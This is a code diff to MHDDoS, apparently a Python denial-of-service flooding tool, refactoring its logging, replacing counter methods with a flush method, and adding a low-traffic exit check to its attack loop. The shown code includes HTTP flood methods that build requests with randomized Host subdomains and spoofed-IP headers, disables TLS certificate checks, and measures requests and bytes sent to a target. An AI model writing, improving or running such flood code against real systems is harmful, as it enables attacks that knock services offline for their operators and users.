@@ -1,10 +1,10 @@
-#!/usr/bin/env python3
+#!/usr/bin/env python
 
+import logging
 from concurrent.futures import ThreadPoolExecutor, as_completed
 from contextlib import suppress
 from itertools import cycle
 from json import load
-from logging import basicConfig, getLogger, shutdown
 from math import log2, trunc
 from multiprocessing import RawValue
 from os import urandom as randbytes
@@ -35,10 +35,9 @@ from psutil import cpu_percent, net_io_counters, process_iter, virtual_memory
 from requests import Response, Session, exceptions, get, cookies
 from yarl import URL
 
-basicConfig(format='[%(asctime)s - %(levelname)s] %(message)s',
-            datefmt="%H:%M:%S")
-logger = getLogger("MHDDoS")
-logger.setLevel("INFO")
+from scripts.utils import LOW_TRAFFIC, setup_logger, LOW_TRAFFIC_BPS
+
+
 ctx: SSLContext = create_default_context(cafile=where())
 ctx.check_hostname = False
 ctx.verify_mode = CERT_NONE
@@ -67,11 +66,11 @@ def getMyIPAddress():
     return getMyIPAddress()
 
 
-def exit(*message):
+def exit(*message, status=1):
     if message:
         logger.error(" ".join(message))
-    shutdown()
-    _exit(1)
+    logging.shutdown()
+    _exit(status)
 
 
 class Methods:
@@ -107,12 +106,9 @@ class Counter:
         self._value.value += value
         return self
 
-    def __int__(self):
-        return self._value.value
-
-    def set(self, value):
-        self._value.value = value
-        return self
+    def flush(self):
+        value, self._value.value = self._value.value, 0
+        return value
 
 
 REQUESTS_SENT = Counter()
@@ -810,9 +806,9 @@ class HttpFlood(Thread):
 
     def DYN(self):
         payload: Any = str.encode(self._payload +
-                                          "Host: %s.%s\r\n" % (ProxyTools.Random.rand_str(6), self._target.authority) +
-                                          self.randHeadercontent +
-                                          "\r\n")
+                                  "Host: %s.%s\r\n" % (ProxyTools.Random.rand_str(6), self._target.authority) +
+                                  self.randHeadercontent +
+                                  "\r\n")
         s = None
         with suppress(Exception), self.open_connection() as s:
             for _ in range(self._rpc):
@@ -879,10 +875,10 @@ class HttpFlood(Thread):
 
     def NULL(self) -> None:
         payload: Any = str.encode(self._payload +
-                                          "Host: %s\r\n" % self._target.authority +
-                                          "User-Agent: null\r\n" +
-                                          "Referrer: null\r\n" +
-                                          self.SpoofIP + "\r\n")
+                                  "Host: %s\r\n" % self._target.authority +
+                                  "User-Agent: null\r\n" +
+                                  "Referrer: null\r\n" +
+                                  self.SpoofIP + "\r\n")
         s = None
         with suppress(Exception), self.open_connection() as s:
             for _ in range(self._rpc):
@@ -1110,9 +1106,9 @@ class ToolsConsole:
 
                         with get(domain, timeout=20) as r:
                             logger.info(('status_code: %d\n'
-                                      'status: %s') %
-                                      (r.status_code, "ONLINE"
-                                      if r.status_code <= 500 else "OFFLINE"))
+                                         'status: %s') %
+                                        (r.status_code, "ONLINE"
+                                        if r.status_code <= 500 else "OFFLINE"))
 
             if cmd == "INFO":
                 while True:
@@ -1313,6 +1309,7 @@ def handleProxyList(con, proxy_li, proxy_ty, url=None):
 
 
 if __name__ == '__main__':
+    logger = setup_logger("MHDDoS")
     with open(__dir__ / "config.json") as f:
         con = load(f)
         with suppress(KeyboardInterrupt):
@@ -1455,14 +1452,18 @@ if __name__ == '__main__':
                     % (target or url.human_repr(), method, timer, threads))
                 event.set()
                 ts = time()
+                PERIOD_SECONDS = 10
                 while time() < ts + timer:
-                    logger.debug('PPS: %s, BPS: %s / %d%%' %
-                                 (Tools.humanformat(int(REQUESTS_SENT)),
-                                  Tools.humanbytes(int(BYTES_SEND)),
-                                  round((time() - ts) / timer * 100, 2)))
-                    REQUESTS_SENT.set(0)
-                    BYTES_SEND.set(0)
-                    sleep(1)
+                    sleep(PERIOD_SECONDS)
+                    rps = REQUESTS_SENT.flush() / PERIOD_SECONDS
+                    bps = BYTES_SEND.flush() / PERIOD_SECONDS
+                    logger.info('RPS: %s, BPS: %s / %d%%' %
+                                (Tools.humanformat(rps),
+                                 Tools.humanbytes(bps),
+                                 round((time() - ts) / timer * 100, 2)))
+                    if bps < LOW_TRAFFIC_BPS:
+                        logger.warning('Low traffic')
+                        exit(status=LOW_TRAFFIC)
 
                 event.clear()
                 exit()
